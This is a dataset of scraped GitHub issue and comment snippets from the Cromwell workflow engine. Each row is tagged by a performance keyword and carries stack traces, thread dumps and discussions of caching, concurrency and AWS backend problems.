Performance,") ~[cromwell.jar:0.19]; at scala.util.Success.map(Try.scala:237) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.pollAndExecAll(ForkJoinPool.java:1253) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1346) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; 2016-06-01 16:10:15,093 cromwell-system-akka.actor.default-dispatcher-15 ERROR - WorkflowActor [UUID(88b21d2d)]: Call failed to initialize: failed to create call actor for PairedEndSingleSampleWorkflow.$final_call$copy_workflow_log: None.get; 2016-06-01 16:10:15,093 cromwell-system-akka.actor.default-dispatcher-15 INFO - WorkflowActor [UUID(88b21d2d)]: persisting status o",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/927:3648,concurren,concurrent,3648,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/927,1,['concurren'],['concurrent']
Performance,"); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.buildHttpRequest(AbstractGoogleClientRequest.java:399); 	at cromwell.backend.google.pipelines.v1alpha2.GenomicsFactory$$anon$1.runRequest(GenomicsFactory.scala:85); 	at cromwell.backend.google.pipelines.common.api.clients.PipelinesApiRunCreationClient.runPipeline(PipelinesApiRunCreationClient.scala:53); 	at cromwell.backend.google.pipelines.common.api.clients.PipelinesApiRunCreationClient.runPipeline$(PipelinesApiRunCreationClient.scala:48); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.runPipeline(PipelinesApiAsyncBackendJobExecutionActor.scala:92); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.$anonfun$createNewJob$19(PipelinesApiAsyncBackendJobExecutionActor.scala:572); 	at scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:307); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```; And instead of terminating immediately,",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-664685629:2129,concurren,concurrent,2129,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-664685629,1,['concurren'],['concurrent']
Performance,"); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.$anonfun$handleExecutionFailure$1(PipelinesApiAsyncBackendJobExecutionActor.scala:707); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:704); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:92); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1258); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1254); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:417); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2020-08-25 10:40:46,27] [info] WorkflowMana",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5804:2515,concurren,concurrent,2515,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5804,1,['concurren'],['concurrent']
Performance,"); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.$anonfun$handleExecutionFailure$1(PipelinesApiAsyncBackendJobExecutionActor.scala:707); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:704); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:92); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1258); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1254); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:417); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2020-08-25 10:40:46,27] [info] WorkflowMana",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-680258929:2793,concurren,concurrent,2793,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-680258929,1,['concurren'],['concurrent']
Performance,"); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.$anonfun$handleExecutionFailure$1(PipelinesApiAsyncBackendJobExecutionActor.scala:815); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:812); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:95); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1340); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1336); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:417); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). 2021-09-27 13:50:53,979 cromwell-system-akka",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6506:14789,concurren,concurrent,14789,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6506,1,['concurren'],['concurrent']
Performance,); 	at cromwell.core.simpleton.WomValueBuilder$.$anonfun$toWdlValues$5(WomValueBuilder.scala:147); 	at scala.collection.TraversableLike.$anonfun$map$1(TraversableLike.scala:234); 	at scala.collection.immutable.Map$Map1.foreach(Map.scala:120); 	at scala.collection.TraversableLike.map(TraversableLike.scala:234); 	at scala.collection.TraversableLike.map$(TraversableLike.scala:227); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.core.simpleton.WomValueBuilder$.toWdlValues(WomValueBuilder.scala:147); 	at cromwell.core.simpleton.WomValueBuilder$.toJobOutputs(WomValueBuilder.scala:133); 	at cromwell.jobstore.SqlJobStore.$anonfun$readJobResult$2(SqlJobStore.scala:74); 	at scala.Option.map(Option.scala:146); 	at cromwell.jobstore.SqlJobStore.$anonfun$readJobResult$1(SqlJobStore.scala:70); 	at scala.util.Success.$anonfun$map$1(Try.scala:251); 	at scala.util.Success.map(Try.scala:209); 	at scala.concurrent.Future.$anonfun$map$1(Future.scala:289); 	at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); 	at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3012:1908,concurren,concurrent,1908,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3012,2,['concurren'],['concurrent']
Performance,"); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""pool-1-thread-1"" #27 prio=5 os_prio=31 tid=0x00007fb76f4b6000 nid=0x7b03 waiting on condition [0x000000012b643000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""db-1"" #26 daemon prio=5 os_prio=31 tid=0x00007fb76b442000 nid=0x7903 waiting on condition [0x000000012d905000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.l",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:39672,concurren,concurrent,39672,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-2"" #43 prio=5 os_prio=31 tid=0x00007fb76e8ee000 nid=0x3f0b waiting on condition [0x000000012ee35000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""_jprofiler_control_sampler"" #34 daemon prio=9 os_prio=31 tid=0x00007fb771044800 nid=0x6307 waiting on condition [0x000000012ab3a000]; java.lang.Thread.State: TIMED_WAITING (sleeping); at java.lang.Thread.sleep(Native Method); at com.jprofiler.agent.probe.y.run(ejt:1030). ""_jprofiler_native_sampler"" #37 daemon prio=10 os_prio=31 tid=0x00007fb76d269000 nid=0x5d07 runnable [0x0000000000000000]; java.lang.Thread.State: RUNNABLE. ""_jprofiler_native_comm"" #36 daemon prio=5 os_prio=31 tid=0x00007fb770d7d000 nid=0x3707 runnable [0x0000000000000000]; java.lang.Thread.State: RUNNABLE. ""_jprofiler_sampler"" #35 daemon prio=10 os_prio=31 tid=0x00007fb",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:34906,concurren,concurrent,34906,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-3"" #57 prio=5 os_prio=31 tid=0x00007fb76e95e000 nid=0x9b03 waiting on condition [0x00000001322d6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-17"" #56 daemon prio=5 os_prio=31 tid=0x00007fb76b6b6000 nid=0x9903 waiting on condition [0x0000000131db9000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lock",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:20045,concurren,concurrent,20045,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-4"" #60 prio=5 os_prio=31 tid=0x00007fb76d42b000 nid=0xa103 waiting on condition [0x0000000132168000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-19"" #59 daemon prio=5 os_prio=31 tid=0x00007fb770631000 nid=0x9f03 waiting on condition [0x00000001324dc000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lock",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:17015,concurren,concurrent,17015,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"* Removes the awkward plateauing of running jobs at 2k, 4k, 6k, etc when running several thousand jobs concurrently.; * Does not introduce very long delays into execution store processing like the previous attempt to ""fix"" the execution store.; * Allows us to get a more accurate count of total jobs queued in the system because they will express themselves as EJEAs waiting for tokens rather than pre-queue-queued items of which we have no visibility.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6034:103,concurren,concurrently,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6034,3,"['concurren', 'queue']","['concurrently', 'queue-queued', 'queued']"
Performance,"* ~Created BT-346 to support requester pays GCR pulls.~ Looks like Denis [already asked about this](https://github.com/GoogleCloudPlatform/docker-credential-gcr/issues/36) and it doesn't appear to be on the roadmap for GCR.; * Cromwell does have support for Docker image caches on PAPI v2 beta, but this has not yet been rolled out to Terra (BT-116).; * Tagging in @wnojopra who has been working on regionality concerns (though not involving container repos AFAIK):; ** #6432 ; ** #6332; * I'm curious how requester pays image pulls would work with [Google Artifact Registry](https://cloud.google.com/artifact-registry/docs/transition/transition-from-gcr), the ""evolution"" of GCR which as I understand it is not as closely coupled to buckets.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-884451767:271,cache,caches,271,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-884451767,1,['cache'],['caches']
Performance,"**@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1597,cache,cache,1597,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,1,['cache'],['cache']
Performance,"**Backend:** AWS. **Workflow:** https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/broad-containers-workflow.wdl; **First input json:** https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/broad-containers-parameters.json; **Second input json is LIKE this one, but refers to a batch of 100 input datasets:** https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/broad-containers-batchofOne.json. **Config:** ; Installed the cromwell version in PR #4790. . **Error:**; ```; ""callCaching"": {; ""allowResultReuse"": true,; ""hit"": false,; ""result"": ""Cache Miss"",; ""effectiveCallCachingMode"": ""ReadAndWriteCache"",; ""hitFailures"": [; {; ""dd860da7-bed8-4e70-812c-227f4e6fead8:Panel_BWA_GATK4_Samtools_Var_Annotate_Split.SamToFastq:0"": [; {; ""causedBy"": [; {; ""causedBy"": [],; ""message"": ""The specified copy source is larger than the maximum allowable size for a copy source: 5368709120 (Service: S3, Status Code: 400, Request ID: AE0D7E6A63C706E5)""; }; ],; ""message"": ""[Attempted 1 time(s)] - S3Exception: The specified copy source is larger than the maximum allowable size for a copy source: 5368709120 (Service: S3, Status Code: 400, Request ID: AE0D7E6A63C706E5)""; }; ```. This version of Cromwell does seem to successfully access and copy a cached file from a previous workflow at least on the first task in a shard. This workflow is essentially a batch in which each row of a batch file is passed to a shard and then the tasks run independently on each input dataset and they never gather. However, when the files get larger than the single test data set it seems it can't get to the previous file in order to determine if there's a hit.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4805:710,Cache,Cache,710,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4805,2,"['Cache', 'cache']","['Cache', 'cached']"
Performance,"**Status update**. tl;dr If one had to try to run the single sample pipeline on AWS, use a single i3.16xlarge spot instance, SUSE ECS optimized Linux, user data something like [this](https://github.com/broadinstitute/aws-backend-private/blob/master/scripts/suse-monster.sh), and otherwise follow the [lengthy script](https://docs.google.com/document/d/1qwY0QBo04WIAvsACbvtIshfxbs1OJRvNp93oclxCRk8/edit). But there’s still very little chance (like < 2%) that the workflow will succeed with full size BAMs. **SEGVs**. Amazon Linux ECS optimized (currently 64-bit amzn-ami-2016.09.g-amazon-ecs-optimized - ami-275ffe31) produces SEGVs with a consistency that makes it rare for workflows to survive to the MarkDuplicates step. No known workaround. Action: Don’t use Amazon Linux. **EFS**. EFS is currently several times slower for most tasks and orders of magnitude slower for MarkDuplicates. No known workaround. Action: Don’t use EFS, use a single-machine cluster. **NVMe drive disconnection**. SUSE Linux has a bug where the NVMe drives on i3 instance types (my preferred instance type with lots of fast instance storage) are randomly disconnected at boot time. Action: Live with it, harden the 